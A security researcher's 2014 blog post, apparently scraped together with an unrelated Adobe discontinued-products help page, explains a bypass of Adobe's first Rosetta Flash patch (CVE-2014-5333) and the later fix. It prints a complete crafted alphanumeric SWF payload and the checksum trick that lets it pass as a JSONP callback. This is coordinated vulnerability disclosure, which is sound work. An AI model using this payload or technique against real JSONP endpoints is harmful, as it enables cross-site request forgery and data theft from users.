=== Content from miki.it_345752b3_20250125_135007.html ===

[![](/favicon.ico)](/)
[About Miki](https://miki%2eit)
# Adobe fixed Rosetta Flash today

August 15, 2014

**Adobe** pushed a tentative fix for Rosetta Flash in **Flash Player 14 beta codename Lombard** (version 14.0.0.125, [release notes](https://labsdownload.adobe.com/pub/labs/flashruntimes/shared/air14_flashplayer14_releasenotes.pdf)) and finalized the fix in the next release, version **14.0.0.145**, on July 8, 2014.

In the [security bulletin APSB14-17](https://helpx.adobe.com/security/products/flash-player/apsb14-17.html), Adobe mentions a stricter verification of the SWF file format:

These updates include additional validation checks to ensure that Flash Player rejects malicious content from vulnerable JSONP callback APIs (CVE-2014-4671).

What I quickly found out after reversing the patch is that **the fix was not good enough**.

### The old 14.0.0.145 fix

[![](https://static.miki.it/images/rosettaflash_patch.png)](https://static.miki.it/images/rosettaflash_patch.png)
Reversing the 14.0.0.145 patch

What Flash Player used to do in order to disrupt *Rosetta Flash-like* attacks was:

1. Check the **first 8 bytes** of the file. If there is at least one JSONP-disallowed character, then the SWF is considered **safe** and no further check is performed.
2. Flash will then check the **next 4096 bytes**. If there is at least one JSONP-disallowed character, the file is considered **safe**.
3. Otherwise the file is considered **unsafe** and is **not executed**.

#### First problem: JSONP whitelist too broad

The JSONP-disallowed list was `[^0-9A-Za-z\._]` and was **too broad**. For instance, they were considering the `$` character as disallowed in a JSONP callback, which is often not true, because of jQuery and other fancy JS libraries.

This means that if you add `$` to the `ALLOWED_CHARSET` in Rosetta Flash, and the JSONP endpoint allows the dollar sign in the callback (they almost always do), you **bypass the fix**.

#### Second problem: we control the ADLER32 checksum!

[![](https://static.miki.it/images/rosettaflash_wrapping.png)](https://static.miki.it/images/rosettaflash_wrapping.png)
Structure of a Rosetta Flash-generated SWF file

A Rosetta Flash-generated SWF file ends with **four bytes** that are the **manipulated ADLER32 checksum** of the original, uncompressed SWF. A motivated attacker can use the last four malleable bytes to **match something already naturally returned by the JSONP endpoint after the padding**.

An example that always works is the **one character right after the reflected callback**: an open parenthesis: `(`.

So, if we make the last byte of the checksum a `(`, and the rest of the SWF is alphanumeric, **we can pass as a callback the file except the last byte**, and **we will have a response with a full valid SWF that bypasses the check by Adobe** (because `(` is disallowed in callbacks).

We are lucky: the last byte of the checksum is the **least significant** of **S1**, a partial sum, and **it is trivial to force it** to `(` with our *Sled + Delta* bruteforcing technique.

Here is a **valid alphanum Flash file that ends with an open parenthesis** and that we could pass, trimming the last character, as a JSONP callback (wrapped, remove *newlines*):

```
CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt333
swW0ssG033wDDtpt33333www03333gFPoHXwHHhOHHFhH3D0Up0IZUnnnnnnnnn
nnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333333333333333s03sDTVqef
XAxooooD0CiudIbEAt333wEDDt0GDGpDDwGG0wttttwwDtwt33333www033333G
fBDTHHHHChHHHMRFHHHhHHCccCSsgSkKoumWW7D0Up0IZUnnnnnnnnnnnnnnnnn
nnUU5nnnnnn3Snn7YNqdIbeUVUUUeF13333WUDUUT1333G1333333WUU03GDTVq
efXA8oddx888f9V0CiudIbEAt3W0wDt033sGG0GttGwt33333333ww0333GDfBD
hRHJqqIHZvAqFzAHjVUVYrvqQQzrEVAArzrAnVrzQfrNeYErmqeHjVUVYrvqQQz
ryzmrvqqfFmVHjVUVYrvqQQz2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3S
nn7CiudIbEAtswwW0GDDG033st0GDDGwGGG33333333s033sDdFPvrfZbynqbJA
yHRZIZAbznNNrbAqNbrAnqNjbrNjbjZaZAQbynqHRZIZAbznNNrbVZQbynqbjni
NHRZIZAbznNNrbzFIZbynqb1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Sn
n7wiudIbEAtwWDttDDDwpDGpDDwG0stDDGptDwpDttt3st3GDDDtDDDtDDDGDDD
t033sDDt333wwv33gBDIHjYqqEHEVHEfuEHdHnQFfuHVaEHyfEJfuEbqYaZEHAf
QvENHyzYqAAHaZuyzYqAAHyfEJnafqeEHIYqEqEMIfHaZnQHynmfHrEZvfHNfnv
NEHzYfZEfJfuEbnfAFHZIIHBrrfERYqIbAZvyHJfuEbqYaZEHWXHDHLttwXHOhW
XHDhLWXHDHgDHHHHxlHoHWTHDXD8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnn
n3Snn7CiudIbEAtwu3swD33wwGptpDDG0333sG0w33333www033GdFPtxtDtdtT
TdHHHWOhHXVoXHttnoXHtLwoxHtlttnoXHtLwoXHtlwodH4D0Up0IZUnnnnnnnn
nnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwuDwG333sw0GtDDDw03333sDt3333
3sG03sDDdFPtxXdHNwXHdLggGGWwXHdHNwXHdlgwDHDhHHHddNwXHdTg7D0Up0I
ZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333sE0GDtDDDtDDDwDG
pDDwGGpt03wDDDGDDDG0333st333swwv3wwwFPXHLRKvOXHLHAODHLBLHAOXHLB
SOdHthHHHcODHDXLrSCsOXHLLAOXHLlSODHLJLLAOXHLlSOXHLjSsOtHtotHHLH
AOtHtXHHHLhAOXHLZKvWhHHsODHDHLzSWhHhvODHDHLFwBHHhHxmHXgGHkHOXHL
HAOXHLbSOtHLftQHHHsOXHLVAOXHLvSOaH4D0Up0IZUnnnnnnnnnnnnnnnnnnnU
U5nnnnnn3Snn7GNqdIbeUV13333333333333333sUUfpDDqUE0gfzAox88D8888
D8888D88880CiudIbEAt3sWtwG3swwGptwG0wDG03333GDD33333sw033gFPLlt
THHHLLnwXHLVWfwXHLHnwlHLvtHHHHLHGggwrHthHHHXDhtxHHHLNkfwlHDHLBt
HHHHg7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwEwDGG
ptwtG03sDwwwGDGt3wwGGwGDtGDsw0GDtGpDDt33333www033GdFPtHDHTLdHHH
HTBrnHRxjHHHObHDHvQJaZMvJfNHgCcGHVKKkHSmcsHoXHTHwhHHloXHThbodHd
hHHHTXboXHTxAlH2D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SnnwWNqdIb
e13333333333333WfV133sUU03sDUVUUUefXA888ooooooooooooooooooooooo
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
oooooooooooooooooooooooooooooooooooooooooooc8888888888888888888
8888888888880tvI(

```

This issue has [CVE-2014-5333](https://nvd.nist.gov/vuln/detail/CVE-2014-5333).

### The new fix in 14.0.0.176

I reported the bypass to Adobe as soon as I discovered it, a few days after my writeup was published. We worked together for coming up with a complete fix.

The new version, released on August 12 2014, does the following checks in sequence:

1. Look for `Content-Type: application/x-shockwave-flash` header. If found, return **OK**.
2. Scan the **first 8 bytes** of the file. If any byte is >= `0x80` (non-ASCII), return **OK**.
3. Scan the rest of the SWF, and at maximum 4096 bytes. If any byte is >= `0x80`, return **OK**.
4. **The SWF is invalid, do not execute it**.

In the [security bulletin APSB14-18](https://helpx.adobe.com/security/products/flash-player/apsb14-18.html), Adobe mentions the new validation:

These updates include a new validation check to handle specially crafted SWF content that can bypass restrictions introduced in version 14.0.0.145. The new restrictions in 14.0.0.176 prevent Flash Player from being used for cross-site request forgery attacks on JSONP endpoints (CVE-2014-5333).

I believe this is finally enough.

### Credits

Thanks to **Nicolas Ruff**, my colleague at Google, for reversing the patches and to [Avira Blog](https://www.avira.com/en/blog/understanding-rosetta-flash-vulnerability) for the illustration at the top of this blog post.

[The power of DNS rebinding: stealing WiFi passwords with a website](/posts/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/)

[Abusing JSONP with Rosetta Flash](/posts/abusing-jsonp-with-rosetta-flash/)

[![Twitter](https://static.miki.it/images/twitter.svg)](https://twitter.com/mikispag)
[![GitHub](https://static.miki.it/images/github.svg)](https://github.com/mikispag)



=== Content from helpx.adobe.com_e8e8d0f5_20250125_135006.html ===


# Free and discontinued products | Support options

Search

Last updated on
Dec 13, 2024

Learn which Adobe products have been discontinued, and what support resources are available.

Adobe occasionally discontinues the sale, development, or support of a product or technology due to changing market conditions and their impact on customers. Phone and chat support isn't available for free or discontinued software or services. Read more about the support and resources available to learn about discontinued products.

## Which Adobe products are no longer available or supported?

## Find your product

## Most common products

* [LeanPrint](#leanprint)
* [Muse](#Muse)
* [Flash Player](#flash-player)
* [Lightroom 6](#lightroom-6)
* [Font Folio](#font-folio)

---

## Don't see your product listed?

* **Subscription apps**: Adobe provides installers for only our current apps and the previous major version of each. For more information, see [Adobe software support guidelines](/support/programs/support-periods.html).
* **Non-subscription apps**: If your account is still active and you have purchased your app directly from Adobe or registered it, you may be able to [download from your account](/download-install/kb/downloaded-older-app.html).
* **Support resources**: They may not be available for products that are out of their support periods. See [Products and technical support periods](/support/programs/eol-matrix.html).

## Have more questions about discontinued Adobe products?

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

Join the [Adobe community](https://community.adobe.com/) to receive answers to your questions from our expert community members.

## More like this

* [Adobe product availability and support matrix](/support/programs/eol-matrix.html)
* [Adobe apps available for download](/download-install/kb/download-availability.html)
* [Adobe software support guidelines](/support/programs/cc-support-policy.html)

![](/content/dam/helpx/icons/adobe-logo.svg)

## **Get help faster and easier**

Sign in

New user?

Create an account ›

![Avatar]()

Manage account

Quick links

View all your plans
Manage your plans

View quick links

Hide quick links

[Legal Notices](/legal/legal-notices.html)    |    [Online Privacy Policy](https://www.adobe.com/privacy.html)

Share this page

* Copied

### Ask the Community

Post questions and get answers from experts.

[Ask now](https://community.adobe.com/)

### Contact Us

Real help from real people.

[Start now](/contact.html)

^ Back to top

Language Navigation

Language Navigation

Choose a region

Selecting a region changes the language and/or content on Adobe.com.

* Americas
* Brasil
* Canada - English
* Canada - Français
* Latinoamérica
* México
* Argentina
* Colombia
* Perú
* Chile
* United States
* Asia Pacific
* Australia
* Hong Kong S.A.R. of China
* India - English
* Indonesia - English
* Malaysia - English
* New Zealand
* Philippines - English
* Vietnam - English
* 中国
* 中國香港特別行政區
* 台灣地區
* 日本
* Indonesia
* Malaysia
* Pilipinas
* Việt Nam
* भारत
* 한국
* Singapore
* Thailand - English
* ประเทศไทย
* Europe, Middle East and Africa
* Africa - English
* België - Nederlands
* Belgique - Français
* Belgium - English
* Česká republika
* Danmark
* Deutschland
* Eesti
* España
* France
* Greece - English
* Ireland
* Israel - English
* Italia
* Latvija
* Lietuva
* Luxembourg - Deutsch
* Luxembourg - English
* Luxembourg - Français
* Magyarország
* Middle East and North Africa - English
* Nederland
* Norge
* Österreich
* Polska
* Portugal
* România
* Schweiz
* Slovenija
* Slovensko
* Suisse
* Suomi
* Svizzera
* Türkiye
* United Kingdom
* България
* Россия
* Україна
* الشرق الأوسط وشمال أفريقيا - اللغة العربية
* ישראל - עברית
* Sverige
* Saudi Arabia - English
* United Arab Emirates - English
* الإمارات العربية المتحدة
* المملكة العربية السعودية


